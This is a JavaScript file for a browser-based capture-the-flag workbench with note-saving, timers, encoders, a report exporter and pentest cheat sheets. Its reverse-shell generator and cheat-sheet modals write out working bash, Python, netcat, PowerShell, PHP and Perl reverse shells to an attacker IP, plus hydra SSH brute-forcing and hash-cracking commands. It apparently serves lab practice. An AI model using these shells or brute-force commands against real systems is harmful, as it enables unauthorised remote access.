// --- Global Functions (Accessible via HTML inline attributes) ---
function resetWorkbench() {
    if (confirm("Are you sure you want to reset all workbench data? This will clear all inputs, notes, and progress.")) {
        localStorage.clear();
        location.reload();
    }
}

document.addEventListener('DOMContentLoaded', function () {

    // --- Helpers ---
    function b64Decode(str) {
        try {
            return atob(str);
        } catch (e) {
            return str;
        }
    }

    function escapeHtml(text) {
        return text.replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;");
    }

    // --- State Persistence (LocalStorage) ---
    const inputs = document.querySelectorAll('input[type="text"], textarea, select');
    const checkboxes = document.querySelectorAll('input[type="checkbox"]');

    // Load saved data
    inputs.forEach(input => {
        if (input.id) {
            const saved = localStorage.getItem(input.id);
            if (saved !== null) {
                input.value = saved;
            }
        }
    });

    checkboxes.forEach(box => {
        if (box.id) {
            const saved = localStorage.getItem(box.id);
            if (saved !== null) {
                box.checked = saved === 'true';
            }
        }
    });

    // Save data on change
    inputs.forEach(input => {
        input.addEventListener('input', () => {
            if (input.id) {
                localStorage.setItem(input.id, input.value);
                if (input.id === 'target-ip') updateTargetBadge();
            }
        });
    });

    checkboxes.forEach(box => {
        box.addEventListener('change', () => {
            if (box.id) {
                localStorage.setItem(box.id, box.checked);
            }
        });
    });

    // --- Target Status Badge ---
    const targetIpInput = document.getElementById('target-ip');
    const targetBadge = document.getElementById('target-status-badge');

    function updateTargetBadge() {
        if (targetIpInput && targetBadge) {
            if (targetIpInput.value.trim() !== '') {
                targetBadge.className = 'badge badge-online';
                targetBadge.textContent = '🟢 Target Active';
            } else {
                targetBadge.className = 'badge badge-offline';
                targetBadge.textContent = '🔴 No Target IP';
            }
        }
    }
    updateTargetBadge();

    // --- Flag Badges ---
    const userFlagInput = document.getElementById('user-flag');
    const rootFlagInput = document.getElementById('root-flag');
    const userBadge = document.getElementById('user-flag-badge');
    const rootBadge = document.getElementById('root-flag-badge');

    function updateFlags() {
        if (userFlagInput && userBadge) {
            if (userFlagInput.value.trim() !== '') {
                userBadge.className = 'badge badge-user-done';
                userBadge.textContent = '👤 User: Captured';
            } else {
                userBadge.className = 'badge badge-pending';
                userBadge.textContent = '👤 User: Pending';
            }
        }
        if (rootFlagInput && rootBadge) {
            if (rootFlagInput.value.trim() !== '') {
                rootBadge.className = 'badge badge-root-done';
                rootBadge.textContent = '👑 Root: Captured';
            } else {
                rootBadge.className = 'badge badge-pending';
                rootBadge.textContent = '👑 Root: Pending';
            }
        }
    }
    if (userFlagInput) userFlagInput.addEventListener('input', updateFlags);
    if (rootFlagInput) rootFlagInput.addEventListener('input', updateFlags);
    updateFlags();

    // --- Machine Timer ---
    let timerInterval = null;
    let timeLeft = parseInt(localStorage.getItem('ctf_timer_left')) || 7200; // 2 hours in seconds
    const timerDisplay = document.getElementById('timer-display');
    const startBtn = document.getElementById('start-btn');
    const syncBtn = document.getElementById('sync-btn');

    function updateTimerDisplay() {
        const hours = Math.floor(timeLeft / 3600);
        const minutes = Math.floor((timeLeft % 3600) / 60);
        const seconds = timeLeft % 60;
        
        let displayStr = '';
        if (hours > 0) {
            displayStr += String(hours).padStart(2, '0') + ':';
        }
        displayStr += String(minutes).padStart(2, '0') + ':' + String(seconds).padStart(2, '0');
        if (timerDisplay) timerDisplay.textContent = displayStr;
    }
    updateTimerDisplay();

    if (startBtn) {
        startBtn.addEventListener('click', () => {
            if (timerInterval) {
                clearInterval(timerInterval);
                timerInterval = null;
                startBtn.textContent = '▶️ Start (2h)';
            } else {
                startBtn.textContent = '⏸️ Pause';
                timerInterval = setInterval(() => {
                    if (timeLeft > 0) {
                        timeLeft--;
                        localStorage.setItem('ctf_timer_left', timeLeft);
                        updateTimerDisplay();
                    } else {
                        clearInterval(timerInterval);
                        alert('Machine timer finished!');
                    }
                }, 1000);
            }
        });
    }

    if (syncBtn) {
        syncBtn.addEventListener('click', () => {
            timeLeft += 3600; // Add 60 mins
            localStorage.setItem('ctf_timer_left', timeLeft);
            updateTimerDisplay();
        });
    }

    // --- Open Ports Tracker ---
    const portButtons = document.querySelectorAll('.port-btn');
    portButtons.forEach(btn => {
        const portKey = 'port_' + btn.getAttribute('data-port');
        if (localStorage.getItem(portKey) === 'true') {
            btn.classList.add('active');
        }
        btn.addEventListener('click', () => {
            btn.classList.toggle('active');
            localStorage.setItem(portKey, btn.classList.contains('active'));
        });
    });

    // --- Dynamic Reverse Shell Generator ---
    const revPortInput = document.getElementById('rev-port');
    const attackerIpInput = document.getElementById('attacker-ip');
    const revTypeSelect = document.getElementById('rev-type');
    const revOutput = document.getElementById('rev-output');
    const copyRevBtn = document.getElementById('copy-rev-btn');

    function generateRevShell() {
        const ip = attackerIpInput ? attackerIpInput.value.trim() || '10.10.14.X' : '10.10.14.X';
        const port = revPortInput ? revPortInput.value.trim() || '4444' : '4444';
        const type = revTypeSelect ? revTypeSelect.value : 'bash';

        let payload = '';
        switch(type) {
            case 'bash':
                payload = `bash -i >& /dev/tcp/${ip}/${port} 0>&1`;
                break;
            case 'python':
                payload = `python3 -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("${ip}",${port})); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); import pty; pty.spawn("/bin/bash")'`;
                break;
            case 'nc':
                payload = `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ${ip} ${port} >/tmp/f`;
                break;
            case 'powershell':
                payload = `powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("${ip}",${port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()`;
                break;
            case 'php':
                payload = `php -r '$sock=fsockopen("${ip}",${port});exec("/bin/sh -i <&3 >&3 2>&3");'`;
                break;
            case 'perl':
                payload = `perl -e 'use Socket;$i="${ip}";$p=${port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`;
                break;
        }
        if (revOutput) revOutput.value = payload;
    }

    if (revPortInput) revPortInput.addEventListener('input', generateRevShell);
    if (attackerIpInput) attackerIpInput.addEventListener('input', generateRevShell);
    if (revTypeSelect) revTypeSelect.addEventListener('change', generateRevShell);
    generateRevShell();

    if (copyRevBtn && revOutput) {
        copyRevBtn.addEventListener('click', () => {
            navigator.clipboard.writeText(revOutput.value);
            copyRevBtn.textContent = '✅ Copied!';
            setTimeout(() => copyRevBtn.textContent = '📋 Copy', 1500);
        });
    }

    // --- String Encoder / Decoder ---
    const encInput = document.getElementById('enc-input');
    const encOutput = document.getElementById('enc-output');
    const copyEncBtn = document.getElementById('copy-enc-btn');

    document.getElementById('b64-enc-btn')?.addEventListener('click', () => {
        if (encInput && encOutput) {
            try { encOutput.value = btoa(encInput.value); } catch(e) { encOutput.value = 'Error encoding'; }
        }
    });

    document.getElementById('b64-dec-btn')?.addEventListener('click', () => {
        if (encInput && encOutput) {
            encOutput.value = b64Decode(encInput.value);
        }
    });

    document.getElementById('url-enc-btn')?.addEventListener('click', () => {
        if (encInput && encOutput) {
            encOutput.value = encodeURIComponent(encInput.value);
        }
    });

    document.getElementById('url-dec-btn')?.addEventListener('click', () => {
        if (encInput && encOutput) {
            try { encOutput.value = decodeURIComponent(encInput.value); } catch(e) { encOutput.value = 'Error decoding'; }
        }
    });

    document.getElementById('hex-dec-btn')?.addEventListener('click', () => {
        if (encInput && encOutput) {
            try {
                let hex = encInput.value.replace(/^0x/, '').replace(/\s+/g, '');
                let str = '';
                for (let i = 0; i < hex.length; i += 2) {
                    str += String.fromCharCode(parseInt(hex.substr(i, 2), 16));
                }
                encOutput.value = str;
            } catch(e) {
                encOutput.value = 'Error parsing hex';
            }
        }
    });

    document.getElementById('hash-id-btn')?.addEventListener('click', () => {
        if (encInput && encOutput) {
            const val = encInput.value.trim();
            let matches = [];
            if (/^[a-fA-F0-9]{32}$/.test(val)) matches.push('MD5');
            if (/^[a-fA-F0-9]{40}$/.test(val)) matches.push('SHA-1');
            if (/^[a-fA-F0-9]{64}$/.test(val)) matches.push('SHA-256');
            if (val.startsWith('$1$')) matches.push('MD5-Crypt (Linux)');
            if (val.startsWith('$6$')) matches.push('SHA-512-Crypt (Linux)');
            if (val.startsWith('$2y$') || val.startsWith('$2a$')) matches.push('Bcrypt');
            
            encOutput.value = matches.length > 0 ? matches.join(', ') : 'Unknown / Unrecognized Hash Format';
        }
    });

    if (copyEncBtn && encOutput) {
        copyEncBtn.addEventListener('click', () => {
            navigator.clipboard.writeText(encOutput.value);
            copyEncBtn.textContent = '✅ Copied!';
            setTimeout(() => copyEncBtn.textContent = '📋 Copy', 1500);
        });
    }

    // --- Modals & Cheat Sheets ---
    const modalOverlay = document.getElementById('modal-overlay');
    const modalTitle = document.getElementById('modal-title');
    const modalOptions = document.getElementById('modal-options');
    const closeModalBtn = document.getElementById('close-modal-btn');

    const cheatSheets = {
        'netcat': {
            title: '🌐 Network Scan Cheat Sheet',
            content: [
                'nmap -sC -sV -T4 <IP>',
                'nmap -p- --min-rate=1000 <IP>',
                'rustscan -a <IP> -- -sC -sV',
                'nmap -sU --top-ports 20 <IP>'
            ]
        },
        'web': {
            title: '🔍 Web Enumeration Cheat Sheet',
            content: [
                'ffuf -u http://<IP>/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt',
                'gobuster dir -u http://<IP> -w /usr/share/wordlists/dirb/common.txt -t 50',
                'feroxbuster -u http://<IP>',
                'whatweb http://<IP>'
            ]
        },
        'cred': {
            title: '🔑 Credentials & Cracking Cheat Sheet',
            content: [
                'hydra -l user -P /usr/share/wordlists/rockyou.txt ssh://<IP>',
                'john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt',
                'hashcat -m 0 -a 0 hash.txt /usr/share/wordlists/rockyou.txt',
                'smbmap -H <IP>'
            ]
        },
        'privesc': {
            title: '🚀 PrivEsc & SMB Cheat Sheet',
            content: [
                'enum4linux -a <IP>',
                'smbclient // <IP>/share',
                'find / -perm -4000 2>/dev/null (SUID)',
                'sudo -l'
            ]
        },
        'revshell': {
            title: '🐚 Reverse Shell Quick Reference',
            content: [
                'bash -i >& /dev/tcp/<IP>/<PORT> 0>&1',
                'nc -e /bin/sh <IP> <PORT>',
                'python3 -c \'import socket,os,pty;s=socket.socket();s.connect(("<IP>",<PORT>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")\''
            ]
        },
        'netcatlistener': {
            title: '🎧 Netcat Listener Cheat Sheet',
            content: [
                'nc -lvnp 4444',
                'rlwrap nc -lvnp 4444',
                'socat file:`tty`,raw,echo=0 tcp-listen:4444'
            ]
        }
    };

    function openModal(key) {
        const data = cheatSheets[key];
        if (!data || !modalOverlay) return;
        modalTitle.textContent = data.title;
        modalOptions.innerHTML = '';
        
        data.content.forEach(cmd => {
            const wrapper = document.createElement('div');
            wrapper.style.cssText = 'display: flex; gap: 8px; margin-bottom: 8px; align-items: center;';
            
            const input = document.createElement('input');
            input.type = 'text';
            input.value = cmd;
            input.readOnly = true;
            input.style.cssText = 'flex: 1; font-family: monospace; font-size: 0.85rem; padding: 6px;';
            
            const btn = document.createElement('button');
            btn.type = 'button';
            btn.textContent = '📋 Copy';
            btn.style.cssText = 'padding: 6px 10px; font-size: 0.8rem;';
            btn.addEventListener('click', () => {
                navigator.clipboard.writeText(cmd);
                btn.textContent = '✅';
                setTimeout(() => btn.textContent = '📋 Copy', 1200);
            });
            
            wrapper.appendChild(input);
            wrapper.appendChild(btn);
            modalOptions.appendChild(wrapper);
        });
        
        modalOverlay.style.display = 'flex';
    }

    document.getElementById('net-cat-modal-btn')?.addEventListener('click', () => openModal('netcat'));
    document.getElementById('web-modal-btn')?.addEventListener('click', () => openModal('web'));
    document.getElementById('cred-modal-btn')?.addEventListener('click', () => openModal('cred'));
    document.getElementById('privesc-modal-btn')?.addEventListener('click', () => openModal('privesc'));
    document.getElementById('revshell-btn')?.addEventListener('click', () => openModal('revshell'));
    document.getElementById('netcat-btn')?.addEventListener('click', () => openModal('netcatlistener'));

    if (closeModalBtn && modalOverlay) {
        closeModalBtn.addEventListener('click', () => modalOverlay.style.display = 'none');
        modalOverlay.addEventListener('click', (e) => {
            if (e.target === modalOverlay) modalOverlay.style.display = 'none';
        });
    }

    // --- Terminal Command Log Widget ---
    const terminalBody = document.getElementById('terminal-body');
    const terminalInput = document.getElementById('terminal-input');
    const logCmdBtn = document.getElementById('log-cmd-btn');
    const copyLogBtn = document.getElementById('copy-log-btn');
    const clearLogBtn = document.getElementById('clear-log-btn');

    let commandLogs = JSON.parse(localStorage.getItem('ctf_terminal_logs')) || [];

    function renderLogs() {
        if (!terminalBody) return;
        terminalBody.innerHTML = '<div class="term-line term-sys">[SYSTEM] Command log initialized. Type commands below to keep track of execution history.</div>';
        commandLogs.forEach(cmd => {
            const line = document.createElement('div');
            line.className = 'term-line';
            line.innerHTML = `<span class="term-prompt-text">user@ctf-box:~$</span> <span class="term-cmd">${escapeHtml(cmd)}</span>`;
            terminalBody.appendChild(line);
        });
        terminalBody.scrollTop = terminalBody.scrollHeight;
    }
    renderLogs();

    function logCommand() {
        if (!terminalInput) return;
        const val = terminalInput.value.trim();
        if (val !== '') {
            commandLogs.push(val);
            localStorage.setItem('ctf_terminal_logs', JSON.stringify(commandLogs));
            terminalInput.value = '';
            renderLogs();
        }
    }

    if (logCmdBtn) logCmdBtn.addEventListener('click', logCommand);
    if (terminalInput) {
        terminalInput.addEventListener('keydown', (e) => {
            if (e.key === 'Enter') logCommand();
        });
    }

    if (copyLogBtn) {
        copyLogBtn.addEventListener('click', () => {
            const textToCopy = commandLogs.join('\n');
            navigator.clipboard.writeText(textToCopy);
            copyLogBtn.textContent = '✅ Copied!';
            setTimeout(() => copyLogBtn.textContent = '📋 Copy Log', 1500);
        });
    }

    if (clearLogBtn) {
        clearLogBtn.addEventListener('click', () => {
            if (confirm("Clear command history log?")) {
                commandLogs = [];
                localStorage.removeItem('ctf_terminal_logs');
                renderLogs();
            }
        });
    }

    // --- Export Markdown Report ---
    const exportBtn = document.getElementById('export-btn');
    if (exportBtn) {
        exportBtn.addEventListener('click', () => {
            const roomName = document.getElementById('room-name')?.value || 'CTF Room';
            const roomUrl = document.getElementById('room-url')?.value || 'N/A';
            const targetIp = document.getElementById('target-ip')?.value || 'N/A';
            const attackerIp = document.getElementById('attacker-ip')?.value || 'N/A';
            const userFlag = document.getElementById('user-flag')?.value || 'Pending';
            const rootFlag = document.getElementById('root-flag')?.value || 'Pending';
            const credsNotes = document.getElementById('creds-notes')?.value || 'None';
            const reconOutput = document.getElementById('recon-output')?.value || 'No scans recorded.';
            const customNotes = document.getElementById('custom-notes')?.value || 'No notes.';

            let activePorts = [];
            portButtons.forEach(btn => {
                if (btn.classList.contains('active')) activePorts.push(btn.getAttribute('data-port'));
            });

            let checklistMd = '';
            for (let i = 1; i <= 10; i++) {
                const box = document.getElementById(`step-${i}`);
                const labelText = box?.parentElement?.textContent?.trim() || `Step ${i}`;
                const checked = box?.checked ? '[x]' : '[ ]';
                checklistMd += `- ${checked} ${labelText}\n`;
            }

            const mdContent = `# CTF Report: ${roomName}

## 📋 Overview
- **Room URL:** ${roomUrl}
- **Target IP:** ${targetIp}
- **Attacker IP:** ${attackerIp}

## 🚩 Flags
- **User Flag:** \`${userFlag}\`
- **Root Flag:** \`${rootFlag}\`

## 🔌 Open Ports & Services
${activePorts.length > 0 ? activePorts.map(p => `- ${p}`).join('\n') : '- None recorded'}

## 👤 Credentials & Users
\`\`\`text
${credsNotes}
\`\`\`

## 📋 Methodology Checklist
${checklistMd}

## 🔍 Nmap & Recon Output
\`\`\`text
${reconOutput}
\`\`\`

## 💻 Custom Scripts & Notes
\`\`\`text
${customNotes}
\`\`\`

## 🐚 Command Log History
\`\`\`text
${commandLogs.join('\n')}
\`\`\`
`;

            const blob = new Blob([mdContent], { type: 'text/markdown' });
            const url = URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.href = url;
            a.download = `${roomName.replace(/[^a-z0-9]/gi, '_').toLowerCase()}_report.md`;
            document.body.appendChild(a);
            a.click();
            document.body.removeChild(a);
            URL.revokeObjectURL(url);
        });
    }

});
